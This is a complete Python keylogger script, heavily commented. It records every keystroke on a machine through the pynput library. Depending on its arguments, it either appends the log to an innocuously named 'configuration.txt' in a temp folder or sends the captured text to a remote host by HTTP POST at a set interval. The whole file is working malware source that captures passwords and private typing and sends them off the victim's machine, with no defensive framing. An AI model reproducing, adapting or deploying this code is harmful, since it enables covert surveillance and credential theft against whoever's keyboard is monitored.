from pynput import keyboard #monitor keyboard interruptions
import threading #threads for timing the send/write functions
import requests #http request for remote execution
import time, sys, os, tempfile #time capture, read arguments, read/write directories and get temp folder path

#--------------------------------------------------------
class Keylogger:

    #constructor 
    def __init__(self, time_interval, exec_mode, host, port, path):
        self.log = '' #variable to save every key interruption until reset
        self.time_interval = time_interval #time interval to send/write log
        self.exec_mode = exec_mode #execution mode (local or remote)
        self.host = host #host to send the log to (remote execution)
        self.port = port #port to send the log to (remote execution)
        self.path = path #path used to write the log
        self.upper = False #flag variable to know if caps_lock is pressed or not
        self.shift_set = False #flag variable to know if shift is currently pressed or not

    # from pynput documentation:
    # The key parameter passed to callbacks is 
    #     a pynput.keyboard.Key for special keys, 
    #     a pynput.keyboard.KeyCode for normal alphanumeric keys, 
    #     or just None for unknown keys.

    #method that gets executed everytime a keyboard interruption is captured    
    def on_press(self, key):
        try:
            #try to get the char value asuming is a KeyCode (normal alphanumeric keys)
            #it will throw an AttributeError if its not, meaning is an special key (like space, enter, shift...)
            #save the value of the pressed key to a temporary variable "k"
            k = key.char
            #if caps lock is active or shif is currently pressed, convert to uppercase
            if self.upper == True or self.shift_set == True:
                k = k.upper()

        except AttributeError:

            #if this code gets executed, it means the interruption is for an special or unknown key

            #toggle caps_lock flag on or off
            if key == key.caps_lock:
                self.upper = not self.upper
            #if its shift, verifiy that is not currently pressed, if its not then set flag pressed and only write once
            if key == key.shift:
                k = ''
                if self.shift_set == False:
                    self.shift_set = True
                    k = '[' + str(key).split('.')[1].upper() + ']'
                    self.log = self.log + k
                    return None

            #if the interruption is for the space key, save ' ' instead of 'space'
            if key == key.space:
                k = ' '

            #if its different from space and from shift, convert the special key to string (it will have the format "Key.[pressed_key]")
            #and split by the dot (.), it will return an array like this: split_result = ['Key', 'pressed_key'].
            #take the 2nd index of the array, convert to uppercase and surround in brackets to have: [PRESSED_KEY].
            #so if enter is pressed for example, instead of saving 'Key.enter', we'll save '[ENTER]' to the temporary variable "k" 
            elif key != key.shift:
                k = '[' + str(key).split('.')[1].upper() + ']'
        
        #append the value of "k" to the log        
        self.log = self.log + k

    def on_release(self,key):
        #this is only currently being used to track when shift is released or not, to know 
        #if input should be converted to uppercase or not using the shift_set flag attribute
        try:
            if key == key.shift:
                self.shift_set = False
        except AttributeError:
            pass

    #method for local execution, creates a file and continuosly appends captured data.
    def write_log(self):

        #if log is not empty, append the current date and the captured interruptions to a file called configuration.txt
        if self.log != '':
            with open(self.path+'/configuration.txt', 'a+') as f:
                f.write(time.asctime()+":\n")
                f.write(self.log+"\n\n")

            #empty log afterwards
            self.log = ''
        
        #start timer to run this method again in the interval specified in the time_interval attribute
        timer = threading.Timer(self.time_interval, self.write_log)
        timer.start()


    #method for remote execution, captures are send in the body of an http post request            
    def send_log(self):
        #if log is not empty, create the post request to the host and port specified in the attributes and 
        #send log data in the body of the request
        if self.log != '':
            try:
                req = requests.post('http://{host}:{port}/'.format(host = self.host, port = self.port), data = (time.asctime()+":\n"+self.log))
            except:
                raise Exception("Could not connect to the remote server! Halting remote execution.")

            #empty log afterwards
            self.log = ''

        #start time to run this method again in the interval specified in the time_interval attribute
        timer = threading.Timer(self.time_interval, self.send_log)
        timer.start()

    #method to start the keylogger
    def start(self):

        #start the keyboard.Listener (which is a threading.Thread) passing the callback function to be executed
        #when a keyboard interruption gets captured
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:

            #if the execution is --remote, call the send_log function to start the timer
            #if the execution is --local, call the write_log function to start the timer
            if self.exec_mode == '--remote':     
                self.send_log()
            elif self.exec_mode == '--local':
                self.write_log()

            #start the thread
            listener.join()
#---------------------------------------------------------

#function to print the usage of this script
def print_usage():
    print('\nUSAGE:\n\tkeylogger.py time_interval --local [path] | --remote host port \n\n')
    print('Options:\n')
    print('time_interval\tTime interval in between writing/sending the log.',
          '--local\t\tUse local execution (write log locally).',
          '[path]\t\tPath to save the log (local execution).',
          '--remote\tUse remote execution (send the log to web server).',
          'host:\t\tHost (ip address) to send the log to (remote execution).',
          'port\t\tPost to send the log to (remote execution).', '\n', sep = '\n')

def verify_path(path):
    try:
        #check whether the specified path exists or not
        exists = os.path.exists(path)
        if not exists:
          #create if it doesn't exists
          os.makedirs(path)
        return True
    except Exception as e:
        print("ERROR: Could not create specified path.\nDetails:"+str(e))
        return False

try:

    #read the arguments to know the time_interval and execution mode
    if sys.argv[1] == '?':
        print_usage()
        quit()
    time_interval = int(sys.argv[1])
    exec_mode = sys.argv[2]
    if exec_mode == '--local':
        try:
            path = sys.argv[3]
        except:
            path = tempfile.gettempdir()+'/MYK/'
        if verify_path(path) == False:
            quit()
        host = ''
        port = ''
    elif exec_mode == '--remote':
        host = sys.argv[3]
        port = int(sys.argv[4])
        path = ''
    else:
        raise ValueError

    #construct keylogger instance based on arguments
    klog = Keylogger(time_interval, exec_mode, host, port, path)
    #call the start function to start the keylogger
    klog.start()
    print("ok")

#if an error ocurred while reading the arguments, execute below
except (ValueError, IndexError):
    print('ERROR: Bad arguments.\n')
    print_usage()
#if an error ocurred in the execution, execute below
except Exception as e:
    print("ERROR: exception ocurred on execution, details: "+str(e)+"\n")

    
